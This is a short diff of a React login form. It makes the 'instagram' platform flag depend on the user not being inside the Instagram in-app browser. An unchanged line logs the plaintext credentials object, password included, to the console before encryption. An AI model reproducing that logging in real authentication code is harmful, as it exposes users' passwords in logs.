@@ -90,13 +90,13 @@ const Login = ({ country, setIsLoginForm, setIsForgot }) => {
                 email,
                 password,
                 authenticator: isAuth,
-                platform: isInsta ? "instagram" : "",
+                platform: (isInsta && !isInstagramBrowser)  ? "instagram" : "",
             }
             : {
                 phone: email,
                 password,
                 authenticator: isAuth,
-                platform: isInsta ? "instagram" : "",
+                platform:  (isInsta && !isInstagramBrowser) ? "instagram" : "",
             };
         const encrypted = encryptData(credentials)
         console.log(credentials)
